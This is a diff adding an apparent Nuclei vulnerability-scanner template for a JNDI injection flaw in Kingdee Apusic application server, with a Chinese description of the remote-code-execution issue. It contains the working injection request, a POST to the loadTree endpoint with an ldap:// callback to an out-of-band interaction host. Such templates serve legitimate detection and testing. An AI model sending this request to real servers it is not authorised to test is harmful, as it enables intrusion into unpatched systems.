@@ -1,0 +1,28 @@
+id: kingdee-apusic-loadTree-jndi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 由于金蝶Apusic应用服务器权限验证不当，导致攻击者可以向loadTree接口执行JNDI注入，造成远程代码执行漏洞。利用该漏洞需低版本JDK。（漏洞比较旧，8月份补丁已出，金蝶EAS也存在类似漏洞，只是路径不一样）
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/J17-1%E9%87%91%E8%9D%B6-Apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-JNDI%E6%B3%A8%E5%85%A5?id=j17-1%e9%87%91%e8%9d%b6-apusic%e5%ba%94%e7%94%a8%e6%9c%8d%e5%8a%a1%e5%99%a8-jndi%e6%b3%a8%e5%85%a5
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /admin//protect/jndi/loadTree HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        jndiName=ldap://{{interactsh-url}}/
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
